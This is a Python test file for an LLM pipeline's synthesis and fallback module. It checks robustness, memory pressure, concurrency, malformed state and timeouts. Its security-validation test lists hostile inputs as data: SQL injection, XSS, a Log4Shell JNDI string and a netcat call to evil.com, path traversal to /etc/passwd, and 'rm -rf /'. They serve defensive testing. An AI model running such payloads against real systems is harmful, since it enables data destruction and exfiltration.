"""
Synthesis Fallback Tests - Professional Grade with Comprehensive Edge Cases
Testing from Quality Analyst, Performance Engineer, and System Architect perspectives
"""
import pytest
import sys
import os
import time
import threading
from unittest.mock import patch, MagicMock
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from graph.modules.synthesis import generate_contextual_analysis, has_meaningful_results, synthesizer
from graph.state import GraphState

class TestSynthesisFallbackProfessional:
    
    def test_contextual_analysis_robustness(self):
        """Test contextual analysis with comprehensive edge cases"""
        robustness_cases = [
            # Standard cases
            ("Tesla vs Apple comparison", ["Tesla", "Apple"], "comparison"),
            ("Biden response to crisis", ["Biden"], "response"),
            ("Ukraine conflict impact", ["Ukraine"], "impact"),
            
            # Edge cases - malformed input
            ("", [], ""),  # Empty everything
            ("a", [""], ""),  # Minimal input
            ("!@#$%^&*()", ["!@#"], "!@#"),  # Special characters
            ("Tesla" * 100, ["Tesla"] * 50, "analysis"),  # Repeated entities
            
            # Large context scenarios
            ("Tesla analysis", ["Tesla"] + ["Entity" + str(i) for i in range(100)], "analysis"),
            ("Apple news", ["Apple"], "analysis" * 100),  # Large intent
            
            # Unicode and international
            ("Tesla 🚗 analysis", ["Tesla", "🚗"], "analysis"),
            ("Apple 中文 news", ["Apple", "中文"], "news"),
            ("Google עברית updates", ["Google", "עברית"], "updates"),
            
            # Circular entity references
            ("Tesla Apple Tesla Apple", ["Tesla", "Apple", "Tesla"], "circular"),
            
            # Null and None handling
            ("Tesla news", None, "analysis"),
            ("Apple updates", ["Apple"], None),
            
            # Very long queries
            ("Tesla " + "analysis " * 50, ["Tesla"], "analysis"),
            
            # Mixed case and formatting
            ("TESLA vs apple COMParison", ["TESLA", "apple"], "COMParison")
        ]
        
        passed = 0
        failed_cases = []
        
        for query, entities, intent in robustness_cases:
            try:
                # Handle None entities
                safe_entities = entities if entities is not None else []
                safe_intent = intent if intent is not None else "summarize"
                
                start_time = time.time()
                result = generate_contextual_analysis(query, safe_entities, safe_entities, safe_intent)
                end_time = time.time()
                
                # Should complete within reasonable time (3 seconds)
                if end_time - start_time > 3.0:
                    failed_cases.append(f"'{query[:30]}...' -> Timeout ({end_time - start_time:.2f}s)")
                    continue
                
                # Should return a string
                if not isinstance(result, str):
                    failed_cases.append(f"'{query[:30]}...' -> Non-string output: {type(result)}")
                    continue
                
                # Should not be empty for non-empty input
                if query and not result:
                    failed_cases.append(f"'{query[:30]}...' -> Empty result for non-empty query")
                    continue
                
                # Should handle gracefully
                passed += 1
                print(f"✅ Contextual analysis: '{query[:30]}...' -> {len(result)} chars ({end_time - start_time:.3f}s)")
                
            except Exception as e:
                failed_cases.append(f"'{query[:30]}...' -> Exception: {str(e)[:50]}")
        
        if failed_cases:
            print("\n❌ Failed cases:")
            for case in failed_cases[:3]:  # Show first 3 failures
                print(f"  {case}")
        
        success_rate = (passed / len(robustness_cases)) * 100
        print(f"\n📊 Contextual Analysis Robustness: {passed}/{len(robustness_cases)} ({success_rate:.1f}%)")
        return success_rate >= 80
    
    def test_memory_pressure_synthesis(self):
        """Test synthesis under memory pressure conditions"""
        # Create large conversation history
        large_history = []
        for i in range(50):  # 50 conversation turns
            large_history.append({
                "query": f"Query {i} with lots of context " + "data " * 100,
                "result": f"Result {i} " + "x" * 1000,  # 1KB per result
                "entities": [f"Entity{j}" for j in range(10)],
                "timestamp": time.time() - i * 100
            })
        
        # Create large step outputs
        large_step_outputs = {}
        for i in range(20):
            large_step_outputs[f"step_{i}"] = {
                "result": "Large result data " * 500,  # ~8KB per step
                "status": "success",
                "metadata": {"data": "x" * 1000}
            }
        
        memory_test_cases = [
            # Large conversation history
            GraphState(
                user_query="Tesla analysis",
                resolved_query="Tesla analysis",
                active_entities=["Tesla"],
                search_queries=[],
                query_resolution={},
                context_hints={},
                extracted_entities=["Tesla"],
                conversation_history=large_history,
                step_outputs={}
            ),
            
            # Large step outputs
            GraphState(
                user_query="Apple news",
                resolved_query="Apple news",
                active_entities=["Apple"],
                search_queries=[],
                query_resolution={},
                context_hints={},
                extracted_entities=["Apple"],
                conversation_history=[],
                step_outputs=large_step_outputs
            ),
            
            # Both large
            GraphState(
                user_query="Google updates",
                resolved_query="Google updates",
                active_entities=["Google"],
                search_queries=[],
                query_resolution={},
                context_hints={},
                extracted_entities=["Google"],
                conversation_history=large_history[:25],  # Smaller to avoid timeout
                step_outputs={k: v for k, v in list(large_step_outputs.items())[:10]}
            ),
            
            # Circular references in state
            GraphState(
                user_query="Microsoft analysis",
                resolved_query="Microsoft analysis",
                active_entities=["Microsoft", "Microsoft", "Microsoft"],
                search_queries=[],
                query_resolution={"self_ref": "circular"},
                context_hints={"circular": "self_ref"},
                extracted_entities=["Microsoft"] * 20,
                conversation_history=[],
                step_outputs={}
            )
        ]
        
        passed = 0
        for i, state in enumerate(memory_test_cases):
            try:
                start_time = time.time()
                result = synthesizer(state)
                end_time = time.time()
                
                # Should complete within reasonable time (5 seconds for large data)
                if end_time - start_time > 5.0:
                    print(f"❌ Memory pressure {i+1}: Timeout ({end_time - start_time:.2f}s)")
                    continue
                
                # Should return valid result
                if (isinstance(result, dict) and 
                    "final_answer" in result and 
                    isinstance(result["final_answer"], str) and
                    result["final_answer"]):
                    passed += 1
                    print(f"✅ Memory pressure {i+1}: Handled large data ({end_time - start_time:.2f}s)")
                else:
                    print(f"❌ Memory pressure {i+1}: Invalid result format")
                    
            except Exception as e:
                # Memory errors are acceptable defensive behavior
                if any(keyword in str(e).lower() for keyword in ["memory", "timeout", "recursion"]):
                    passed += 1
                    print(f"✅ Memory pressure {i+1}: Defensive error handling - {str(e)[:50]}")
                else:
                    print(f"❌ Memory pressure {i+1}: Unexpected error - {str(e)[:50]}")
        
        success_rate = (passed / len(memory_test_cases)) * 100
        print(f"\n📊 Memory Pressure Synthesis: {passed}/{len(memory_test_cases)} ({success_rate:.1f}%)")
        return success_rate >= 75
    
    def test_concurrent_synthesis_operations(self):
        """Test synthesis under concurrent access"""
        def synthesis_worker(worker_id, results):
            try:
                state = GraphState(
                    user_query=f"Tesla analysis {worker_id}",
                    resolved_query=f"Tesla analysis {worker_id}",
                    active_entities=["Tesla"],
                    search_queries=[],
                    query_resolution={},
                    context_hints={},
                    extracted_entities=["Tesla"],
                    conversation_history=[],
                    step_outputs={}
                )
                
                result = synthesizer(state)
                results[worker_id] = {
                    "success": True, 
                    "result": result,
                    "thread_id": threading.current_thread().ident
                }
            except Exception as e:
                results[worker_id] = {
                    "success": False, 
                    "error": str(e),
                    "thread_id": threading.current_thread().ident
                }
        
        # Test concurrent synthesis operations
        num_threads = 8
        results = {}
        threads = []
        
        for i in range(num_threads):
            thread = threading.Thread(target=synthesis_worker, args=(i, results))
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join(timeout=10)  # 10 second timeout
        
        # Analyze results
        successful = sum(1 for r in results.values() if r.get("success", False))
        unique_threads = len(set(r.get("thread_id") for r in results.values() if r.get("thread_id")))
        
        print(f"✅ Concurrent synthesis: {successful}/{num_threads} successful")
        print(f"✅ Thread isolation: {unique_threads} unique threads")
        
        success_rate = (successful / num_threads) * 100
        print(f"\n📊 Concurrent Synthesis: {successful}/{num_threads} ({success_rate:.1f}%)")
        return success_rate >= 75
    
    def test_malformed_state_handling(self):
        """Test synthesis with malformed state objects"""
        malformed_states = [
            # Missing required fields
            {"user_query": "Tesla news"},  # Missing most fields
            
            # Wrong data types
            GraphState(
                user_query=123,  # Should be string
                resolved_query="Tesla news",
                active_entities="Tesla",  # Should be list
                search_queries="query",  # Should be list
                query_resolution="analysis",  # Should be dict
                context_hints="hints",  # Should be dict
                extracted_entities=None,  # Should be list
                conversation_history="history",  # Should be list
                step_outputs="outputs"  # Should be dict
            ),
            
            # Circular references
            GraphState(
                user_query="Tesla news",
                resolved_query="Tesla news",
                active_entities=["Tesla"],
                search_queries=[],
                query_resolution={},
                context_hints={},
                extracted_entities=["Tesla"],
                conversation_history=[],
                step_outputs={}
            ),
            
            # Extremely large fields
            GraphState(
                user_query="A" * 50000,  # 50KB query
                resolved_query="Tesla news",
                active_entities=["Tesla"] * 1000,  # 1000 entities
                search_queries=[],
                query_resolution={},
                context_hints={},
                extracted_entities=["Tesla"],
                conversation_history=[],
                step_outputs={}
            ),
            
            # None values
            GraphState(
                user_query=None,
                resolved_query=None,
                active_entities=None,
                search_queries=None,
                query_resolution=None,
                context_hints=None,
                extracted_entities=None,
                conversation_history=None,
                step_outputs=None
            )
        ]
        
        passed = 0
        for i, state in enumerate(malformed_states):
            try:
                if isinstance(state, dict):
                    # Handle raw dict (missing fields)
                    result = generate_contextual_analysis(
                        state.get("user_query", ""), [], [], "summarize"
                    )
                    if isinstance(result, str):
                        passed += 1
                        print(f"✅ Malformed state {i+1}: Handled missing fields")
                    else:
                        print(f"❌ Malformed state {i+1}: Invalid result type")
                else:
                    # Handle GraphState with wrong types
                    result = synthesizer(state)
                    if isinstance(result, dict) and "final_answer" in result:
                        passed += 1
                        print(f"✅ Malformed state {i+1}: Handled gracefully")
                    else:
                        print(f"❌ Malformed state {i+1}: Invalid result")
                        
            except Exception as e:
                # Defensive errors are acceptable
                if any(keyword in str(e).lower() for keyword in ["type", "attribute", "memory", "timeout"]):
                    passed += 1
                    print(f"✅ Malformed state {i+1}: Defensive error - {str(e)[:50]}")
                else:
                    print(f"❌ Malformed state {i+1}: Unexpected error - {str(e)[:50]}")
        
        success_rate = (passed / len(malformed_states)) * 100
        print(f"\n📊 Malformed State Handling: {passed}/{len(malformed_states)} ({success_rate:.1f}%)")
        return success_rate >= 75
    
    def test_llm_timeout_simulation(self):
        """Test synthesis behavior when LLM operations timeout"""
        timeout_scenarios = [
            # Simulate LLM timeout with very large context
            GraphState(
                user_query="Analyze this complex situation",
                resolved_query="Analyze this complex situation",
                active_entities=["Tesla", "Apple", "Google"] * 100,
                search_queries=[],
                query_resolution={},
                context_hints={},
                extracted_entities=["Tesla", "Apple", "Google"],
                conversation_history=[{"query": "x" * 10000, "result": "y" * 10000} for _ in range(10)],
                step_outputs={"step1": {"result": "z" * 50000, "status": "success"}}
            ),
            
            # Empty step outputs (should trigger fallback)
            GraphState(
                user_query="Tesla analysis",
                resolved_query="Tesla analysis", 
                active_entities=["Tesla"],
                search_queries=[],
                query_resolution={},
                context_hints={},
                extracted_entities=["Tesla"],
                conversation_history=[],
                step_outputs={}
            ),
            
            # Failed step outputs
            GraphState(
                user_query="Apple news",
                resolved_query="Apple news",
                active_entities=["Apple"],
                search_queries=[],
                query_resolution={},
                context_hints={},
                extracted_entities=["Apple"],
                conversation_history=[],
                step_outputs={"step1": {"result": "", "status": "empty"}}
            )
        ]
        
        passed = 0
        for i, state in enumerate(timeout_scenarios):
            try:
                start_time = time.time()
                result = synthesizer(state)
                end_time = time.time()
                
                # Should complete within reasonable time or provide fallback
                if end_time - start_time > 10.0:
                    print(f"❌ LLM timeout {i+1}: Took too long ({end_time - start_time:.2f}s)")
                    continue
                
                # Should provide some result (even if fallback)
                if (isinstance(result, dict) and 
                    "final_answer" in result and 
                    result["final_answer"]):
                    passed += 1
                    print(f"✅ LLM timeout {i+1}: Provided result/fallback ({end_time - start_time:.2f}s)")
                else:
                    print(f"❌ LLM timeout {i+1}: No result provided")
                    
            except Exception as e:
                # Timeout errors are acceptable
                if any(keyword in str(e).lower() for keyword in ["timeout", "memory", "limit"]):
                    passed += 1
                    print(f"✅ LLM timeout {i+1}: Defensive timeout handling")
                else:
                    print(f"❌ LLM timeout {i+1}: Unexpected error - {str(e)[:50]}")
        
        success_rate = (passed / len(timeout_scenarios)) * 100
        print(f"\n📊 LLM Timeout Simulation: {passed}/{len(timeout_scenarios)} ({success_rate:.1f}%)")
        return success_rate >= 75
    
    def test_security_input_validation(self):
        """Test synthesis security and input validation"""
        security_cases = [
            # Injection attempts in queries
            ("'; DROP TABLE conversations; --", ["Tesla"], "summarize"),
            ("<script>alert('xss')</script>", ["Apple"], "analysis"),
            ("${jndi:ldap://evil.com/a}", ["Google"], "news"),
            
            # Injection attempts in entities
            ("Tesla news", ["'; DELETE FROM entities; --"], "summarize"),
            ("Apple updates", ["<img src=x onerror=alert(1)>"], "analysis"),
            
            # Path traversal
            ("../../../etc/passwd", ["Tesla"], "summarize"),
            ("Tesla news", ["..\\..\\windows\\system32"], "analysis"),
            
            # Large payloads
            ("A" * 100000, ["Tesla"], "summarize"),  # 100KB query
            ("Tesla news", ["B" * 50000], "analysis"),  # 50KB entity
            
            # Control characters and null bytes
            ("Tesla\x00news", ["Apple\x00"], "summarize\x00"),
            ("Google\r\nnews", ["Microsoft\r\n"], "analysis\r\n"),
            
            # Unicode attacks
            ("Tesla \u202e news", ["Apple \u202e"], "analysis"),
            ("Google \ufeff news", ["Microsoft \ufeff"], "summarize"),
            
            # Format string attacks
            ("Tesla %s %d %x news", ["Apple %n"], "%s analysis"),
            
            # Command injection attempts
            ("Tesla; rm -rf /", ["Apple && cat /etc/passwd"], "| nc evil.com 1337")
        ]
        
        passed = 0
        for query, entities, intent in security_cases:
            try:
                result = generate_contextual_analysis(query, entities, entities, intent)
                
                # Should handle without crashing and return safe output
                if (isinstance(result, str) and 
                    result and
                    not any(dangerous in result.lower() for dangerous in 
                           ["<script", "drop table", "rm -rf", "/etc/passwd", "alert("])):
                    passed += 1
                    print(f"✅ Security test: Handled malicious input safely")
                else:
                    print(f"❌ Security test: Unsafe output or crash")
                    
            except Exception as e:
                # Defensive errors are acceptable for security
                if any(keyword in str(e).lower() for keyword in 
                       ["invalid", "encoding", "timeout", "memory", "limit"]):
                    passed += 1
                    print(f"✅ Security test: Defensive error handling")
                else:
                    print(f"❌ Security test: Unexpected error - {str(e)[:50]}")
        
        success_rate = (passed / len(security_cases)) * 100
        print(f"\n📊 Security Input Validation: {passed}/{len(security_cases)} ({success_rate:.1f}%)")
        return success_rate >= 80

def run_professional_synthesis_fallback_tests():
    """Run professional-grade synthesis fallback tests"""
    print("🔬 RUNNING PROFESSIONAL SYNTHESIS FALLBACK TESTS")
    print("=" * 60)
    
    test_suite = TestSynthesisFallbackProfessional()
    
    results = {
        "Contextual Analysis Robustness": test_suite.test_contextual_analysis_robustness(),
        "Memory Pressure Synthesis": test_suite.test_memory_pressure_synthesis(),
        "Concurrent Synthesis Operations": test_suite.test_concurrent_synthesis_operations(),
        "Malformed State Handling": test_suite.test_malformed_state_handling(),
        "LLM Timeout Simulation": test_suite.test_llm_timeout_simulation(),
        "Security Input Validation": test_suite.test_security_input_validation()
    }
    
    print("\n" + "=" * 60)
    print("📋 PROFESSIONAL SYNTHESIS FALLBACK TEST SUMMARY")
    print("=" * 60)
    
    passed_tests = sum(results.values())
    total_tests = len(results)
    
    for test_name, passed in results.items():
        status = "✅ PASS" if passed else "❌ FAIL"
        print(f"{test_name}: {status}")
    
    overall_success = (passed_tests / total_tests) * 100
    print(f"\n🎯 Overall Success Rate: {passed_tests}/{total_tests} ({overall_success:.1f}%)")
    
    if overall_success >= 80:
        print("🎉 SYNTHESIS FALLBACK: PRODUCTION READY")
        return True
    else:
        print("⚠️  SYNTHESIS FALLBACK: NEEDS IMPROVEMENT")
        return False

if __name__ == "__main__":
    run_professional_synthesis_fallback_tests()